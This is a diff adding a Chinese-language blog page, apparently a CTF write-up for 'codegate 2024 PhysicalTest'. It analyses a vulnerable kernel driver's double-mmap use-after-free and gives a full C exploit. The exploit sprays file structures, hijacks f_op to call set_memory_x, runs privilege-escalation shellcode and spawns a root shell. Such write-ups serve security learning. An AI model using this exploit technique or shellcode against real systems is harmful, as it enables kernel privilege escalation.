@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
+    <title>codegate 2024 PhysicalTest</title>
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <nav class="site-nav">
+            <a href="./index.html" class="nav-link">/home</a>
+            <span class="nav-separator">|</span>
+            <a href="./about.html" class="nav-link">/about</a>
+        </nav>
+        <div class="terminal-prompt">
+            <span style="color:#666">[</span><span style="color:#fabd2f">ayoung</span><span style="color:#666">@</span><span style="color:#59adeb">lab</span> <span style="color:#83a598"><a href="./index.html" class="path-link">posts</a></span><span style="color:#666">]$</span> 
+            <span class="cmd">cat ./codegate 2024 PhysicalTest.md</span><span class="cursor">█</span>
+        </div>
+        <h1 class="post-title">codegate 2024 PhysicalTest</h1><div style="color: #666; font-size: 0.8rem; margin-bottom: 20px;">[Last modified: 2025-03-08]</div>
+    </header>
+    <div class="layout-grid">
+                <main><h3 id="fen-xi">分析</h3><p><code>struct page *alloc_pages(gfp_t gfp_mask, unsigned int order);</code>，order为0分配1页，1分配2页</p>
+<p><code>remap_pfn_range</code>：将一段物理内存映射到用户空间的虚拟内存中。函数内部会为p4d申请内存</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#65737e;">/**
+</span><span style="color:#65737e;"> 2  * remap_pfn_range - remap kernel memory to userspace
+</span><span style="color:#65737e;"> 3  * @vma: user vma to map to
+</span><span style="color:#65737e;"> 4  * @addr: target user address to start at
+</span><span style="color:#65737e;"> 5  * @pfn: physical address of kernel memory
+</span><span style="color:#65737e;"> 6  * @size: size of map area
+</span><span style="color:#65737e;"> 7  * @prot: page protection flags for this mapping
+</span><span style="color:#65737e;"> 8  *
+</span><span style="color:#65737e;"> 9  *  Note: this is only safe if the mm semaphore is held when called.
+</span><span style="color:#65737e;">10  */
+</span><span style="color:#d08770;">11 </span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">remap_pfn_range</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> vm_area_struct *vma, </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> addr,
+</span><span style="color:#d08770;">12             </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> pfn, </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> size, pgprot_t prot);
+</span></pre>
+<p><code>down_write</code>和<code>up_write</code>读写锁</p>
+<p><code>void zap_vma_ptes(struct vm_area_struct * vma, unsigned long address, unsigned long size)</code>，remove ptes mapping the vma</p>
+<p>open：<code>alloc_pages</code>依次申请了四个物理页面ABCD，并将BCD清0，将D开头写入<code>{codegate2024}</code>
+read：从C读取内容
+mmap：页ABC可以作为单个0x3000大小的映射映射到用户地址空间，vma结构体会被存在全局变量<code>backing_vma</code>。之后再调用mmap，这个全局变量会被覆盖，结构体没有做清除
+write：将写入的字节（最多0x700）复制到页B，实现了一个类似编辑距离（Levenshtein distance）的算法在B和C之间计算相似度，如果B中数据长度超过0x700则释放页A、B和C，删除backing_vma并用<code>zap_vma_ptes</code>刷新页表项
+release：释放A、B、C页面并zap刷新页表项</p>
+<p><code>v4 = (page_offset_base + ((v3 - vmemmap_base) &gt;&gt; 6 &lt;&lt; 12));</code>
+计算 vmemmap 偏移量：从 vmemmap 基地址计算出偏移量。
+计算页号：将偏移量转换为页号。
+计算页地址：将页号转换为页的起始地址。
+计算虚拟地址：将页地址转换为内核直接映射区的虚拟地址。</p>
+<p>open的时候，<code>v2 = kmalloc_trace(kmalloc_caches[5], 0xDC0LL, 0x20LL);</code>用来存页面物理地址，<code>v2[0]=B，v2[1]=C，v2[2]=A，v2[3]=D</code>，<code>*(a2 + 0xC8) = v2</code>存起来
+在read里<code>v3 = *(a1 + 0xC8);v5 = v3[1];</code>取出C；write里面<code>v3 = *(a1 + 0xC8);v4 = copy_from_user(page_offset_base + ((*v3 - vmemmap_base) &gt;&gt; 6 &lt;&lt; 12), a2, a3);</code>复制到B</p>
+<h3 id="li-yong">利用</h3><p>可以mmap两次，然后write触发free操作，free操作会将之前映射的地址free掉，但由于mmap了两次，在第二次mmap时没有对之前映射的内容做清除，存在UAF</p>
+<p>首先用找到一个[[../../pwn/linux kernel/0 basic/file结构体]]页对齐，修改f_op指针，并布置其中llseak函数指针为set_memory_x，之后使用<code>lseak64(fd, 1, SEEK_SET)</code>触发set_memory_x，set_memory_x函数定义为<code>int set_memory_x(unsigned long addr, int numpages);</code>，此时正好第一个参数为file结构体起始地址 页对齐，第二个参数布置为1，修改当前页为可执行权限</p>
+<p>接着布置好提权shellcode，将llseak指针修改指向shellcode，最后触发即可</p>
+<p>执行binsh前需要将修改的fops指针恢复</p>
+<h3 id="exp">exp</h3><pre style="background-color:#2b303b;">
+<span style="color:#65737e;">#define _GNU_SOURCE
+</span><span style="color:#65737e;">#include &lt;errno.h&gt;
+</span><span style="color:#65737e;">#include &lt;stdio.h&gt;
+</span><span style="color:#65737e;">#include &lt;stdlib.h&gt;
+</span><span style="color:#65737e;">#include &lt;string.h&gt;
+</span><span style="color:#65737e;">#include &lt;sys/fcntl.h&gt;
+</span><span style="color:#65737e;">#include &lt;sys/mman.h&gt;
+</span><span style="color:#65737e;">#include &lt;unistd.h&gt;
+</span><span style="color:#65737e;">#define CHECK(x) ({ errno = 0; typeof(x) __x = (x); if(errno) { perror(#x); exit(1); } __x; })
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">int </span><span style="color:#8fa1b3;">main</span><span style="color:#c0c5ce;">() {
+</span><span style="color:#c0c5ce;">    char buf[</span><span style="color:#d08770;">4096</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">memset</span><span style="color:#c0c5ce;">(buf, </span><span style="color:#d08770;">0xcc</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">4096</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    int fd = </span><span style="color:#8fa1b3;">CHECK</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/dev/test</span><span style="color:#c0c5ce;">&quot;, O_RDWR));
+</span><span style="color:#c0c5ce;">    // int fd2 = </span><span style="color:#8fa1b3;">CHECK</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/dev/test</span><span style="color:#c0c5ce;">&quot;, O_RDWR));
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    // mmap twice to set backing_vm to file </span><span style="color:#d08770;">2
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">CHECK</span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">mmap</span><span style="color:#c0c5ce;">((void*)</span><span style="color:#d08770;">0x30000</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x3000</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">PROT_READ </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">PROT_WRITE </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">PROT_EXEC</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">MAP_SHARED</span><span style="color:#c0c5ce;">, fd, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">));
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">CHECK</span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">mmap</span><span style="color:#c0c5ce;">((void*)</span><span style="color:#d08770;">0x33000</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x3000</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">PROT_READ </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">PROT_WRITE </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">PROT_EXEC</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">MAP_SHARED</span><span style="color:#c0c5ce;">, fd, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">));
+</span><span style="color:#c0c5ce;">    // </span><span style="color:#8fa1b3;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] a: </span><span style="color:#d08770;">%p</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">0x30000</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    // write </span><span style="color:#d08770;">0x701</span><span style="color:#c0c5ce;">-length b to cause write to free </span><span style="color:#96b5b4;">all </span><span style="color:#c0c5ce;">pages
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">memset</span><span style="color:#c0c5ce;">((void*)</span><span style="color:#d08770;">0x30000</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x3000</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">memset</span><span style="color:#c0c5ce;">((void*)</span><span style="color:#d08770;">0x30000 </span><span style="color:#c0c5ce;">+ </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xcc</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">CHECK</span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">write</span><span style="color:#c0c5ce;">(fd, &quot;</span><span style="color:#a3be8c;">a</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">));
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    // spray file structures into freed pages
+</span><span style="color:#c0c5ce;">    int fds[</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(int i=0; i&lt;0x100; i++) {
+</span><span style="color:#c0c5ce;">        fds[i] = </span><span style="color:#8fa1b3;">CHECK</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/dev/urandom</span><span style="color:#c0c5ce;">&quot;, O_RDONLY));
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    // look </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">page-aligned file structure </span><span style="background-color:#bf616a;color:#2b303b;">for</span><span style="color:#c0c5ce;"> overwrite
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">CHECK</span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">write</span><span style="color:#c0c5ce;">(fd, &quot;</span><span style="color:#a3be8c;">a</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">));
+</span><span style="color:#c0c5ce;">    unsigned long *ax = (unsigned long *)</span><span style="color:#d08770;">0x30000</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    unsigned long kernel_base = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    unsigned long file_base = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    unsigned long *file_ax = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(int i=0; i&lt;0x3000; i+=0x1000) {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(ax[i + </span><span style="color:#d08770;">0x30 </span><span style="color:#c0c5ce;">&gt;&gt; </span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">] == ax[i + </span><span style="color:#d08770;">0x38 </span><span style="color:#c0c5ce;">&gt;&gt; </span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">] &amp;&amp; (ax[i + </span><span style="color:#d08770;">0x30 </span><span style="color:#c0c5ce;">&gt;&gt; </span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">] &amp; </span><span style="color:#d08770;">0xfff</span><span style="color:#c0c5ce;">) == </span><span style="color:#d08770;">0x30 </span><span style="color:#c0c5ce;">&amp;&amp; (ax[i + </span><span style="color:#d08770;">0xb0 </span><span style="color:#c0c5ce;">&gt;&gt; </span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">] &amp; </span><span style="color:#d08770;">0xfffff</span><span style="color:#c0c5ce;">) == </span><span style="color:#d08770;">0x91700</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">            file_base = ax[i + </span><span style="color:#d08770;">0x30 </span><span style="color:#c0c5ce;">&gt;&gt; </span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">] - </span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">            file_ax = &amp;ax[i &gt;&gt; </span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">            kernel_base = ax[i + </span><span style="color:#d08770;">0xb0 </span><span style="color:#c0c5ce;">&gt;&gt; </span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">] - </span><span style="color:#d08770;">0x2291700</span><span style="color:#b48ead;">L</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">            </span><span style="background-color:#bf616a;color:#2b303b;">break</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">        </span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] kernel_base: 0x</span><span style="color:#d08770;">%lx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, kernel_base);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] file_base: 0x</span><span style="color:#d08770;">%lx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, file_base);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] file_ax: </span><span style="color:#d08770;">%p</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, file_ax);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    // disable read and see which fd fails to read
+</span><span style="color:#c0c5ce;">    file_ax[</span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">/</span><span style="color:#d08770;">0x8</span><span style="color:#c0c5ce;">] &amp;= ~(</span><span style="color:#d08770;">1</span><span style="color:#b48ead;">L </span><span style="color:#c0c5ce;">&lt;&lt; </span><span style="color:#d08770;">32</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    int goodfd = -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(int i=0; i&lt;0x100; i++) {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">read</span><span style="color:#c0c5ce;">(fds[i], buf, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">fd </span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;">: </span><span style="color:#d08770;">%s</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, fds[i], </span><span style="color:#8fa1b3;">strerror</span><span style="color:#c0c5ce;">(errno));
+</span><span style="color:#c0c5ce;">            goodfd = fds[i];
+</span><span style="color:#c0c5ce;">            </span><span style="background-color:#bf616a;color:#2b303b;">break</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">        </span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(goodfd == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">oops2</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">        </span><span style="background-color:#bf616a;color:#2b303b;">return</span><span style="color:#c0c5ce;"> </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    </span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">good fd = </span><span style="color:#d08770;">%d</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, goodfd);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    // treat space after the file </span><span style="background-color:#bf616a;color:#2b303b;">as</span><span style="color:#c0c5ce;"> scratch space
+</span><span style="color:#c0c5ce;">    char backup[</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">memcpy</span><span style="color:#c0c5ce;">(backup, &amp;file_ax[</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">/</span><span style="color:#d08770;">0x8</span><span style="color:#c0c5ce;">], </span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    file_ax[</span><span style="color:#d08770;">0x108</span><span style="color:#c0c5ce;">/</span><span style="color:#d08770;">0x8</span><span style="color:#c0c5ce;">] = </span><span style="color:#d08770;">0x107b800</span><span style="color:#b48ead;">L </span><span style="color:#c0c5ce;">+ kernel_base; // set_memory_x
+</span><span style="color:#c0c5ce;">    file_ax[</span><span style="color:#d08770;">0xb0</span><span style="color:#c0c5ce;">/</span><span style="color:#d08770;">0x8</span><span style="color:#c0c5ce;">] = file_base + </span><span style="color:#d08770;">0x100</span><span style="color:#b48ead;">L</span><span style="color:#c0c5ce;">; //hijack f_ops
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">lseek64</span><span style="color:#c0c5ce;">(goodfd, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">SEEK_SET</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    // shellcode </span><span style="color:#96b5b4;">exec
+</span><span style="color:#c0c5ce;">    file_ax[</span><span style="color:#d08770;">0x108</span><span style="color:#c0c5ce;">/</span><span style="color:#d08770;">0x8</span><span style="color:#c0c5ce;">] = file_base + </span><span style="color:#d08770;">0x110</span><span style="color:#b48ead;">L</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    const char shellcode[] = &quot;</span><span style="color:#a3be8c;">SH</span><span style="color:#96b5b4;">\213</span><span style="color:#a3be8c;">\35\36\0\0\0H</span><span style="color:#96b5b4;">\215\273\200\311\240</span><span style="color:#a3be8c;">\2H</span><span style="color:#96b5b4;">\215\203</span><span style="color:#a3be8c;">\0</span><span style="color:#96b5b4;">\304\v</span><span style="color:#a3be8c;">\1</span><span style="color:#96b5b4;">\377\320</span><span style="color:#a3be8c;">H</span><span style="color:#96b5b4;">\211\307</span><span style="color:#a3be8c;">H</span><span style="color:#96b5b4;">\215\203</span><span style="color:#a3be8c;">p</span><span style="color:#96b5b4;">\301\v</span><span style="color:#a3be8c;">\1</span><span style="color:#96b5b4;">\377\320</span><span style="color:#a3be8c;">[</span><span style="color:#96b5b4;">\303</span><span style="color:#a3be8c;">AAAAAAAA</span><span style="color:#c0c5ce;">&quot;;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">memcpy</span><span style="color:#c0c5ce;">(&amp;file_ax[</span><span style="color:#d08770;">0x110</span><span style="color:#c0c5ce;">/</span><span style="color:#d08770;">0x8</span><span style="color:#c0c5ce;">], shellcode, </span><span style="color:#8fa1b3;">sizeof</span><span style="color:#c0c5ce;">(shellcode));
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">memcpy</span><span style="color:#c0c5ce;">((char *)&amp;file_ax[</span><span style="color:#d08770;">0x110</span><span style="color:#c0c5ce;">/</span><span style="color:#d08770;">0x8</span><span style="color:#c0c5ce;">] + </span><span style="color:#8fa1b3;">sizeof</span><span style="color:#c0c5ce;">(shellcode) - </span><span style="color:#d08770;">9</span><span style="color:#c0c5ce;">, &amp;kernel_base, </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">executing shellcode!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">lseek64</span><span style="color:#c0c5ce;">(goodfd, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">SEEK_SET</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">good to go!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    file_ax[</span><span style="color:#d08770;">0xb0</span><span style="color:#c0c5ce;">/</span><span style="color:#d08770;">0x8</span><span style="color:#c0c5ce;">] = </span><span style="color:#d08770;">0x2291700</span><span style="color:#b48ead;">L </span><span style="color:#c0c5ce;">+ kernel_base; // restore fops 
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">system</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/bin/sh</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">
+</span></pre>
+</main>
+                <aside class="toc-sidebar">
+                    <div class="toc-sticky-container">
+                        <div class="toc-header">:: Contents ::</div>
+                        <ul class="toc-list"><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#fen-xi">分析</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#li-yong">利用</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#exp">exp</a></li></ul>
+                    </div>
+                </aside>
+            </div> 
+    <footer style="margin-top: 50px; border-top: 1px solid #333; padding-top: 20px; font-size: 0.8rem; color: #555; text-align: center;">
+        Built with Rust. <span style="color: #66ed59;">EOF</span>
+    </footer>
+    <button id="back-to-top" aria-label="Back to Top">^TOP</button>
+    <script src="script.js"></script>
+</body>
+</html>
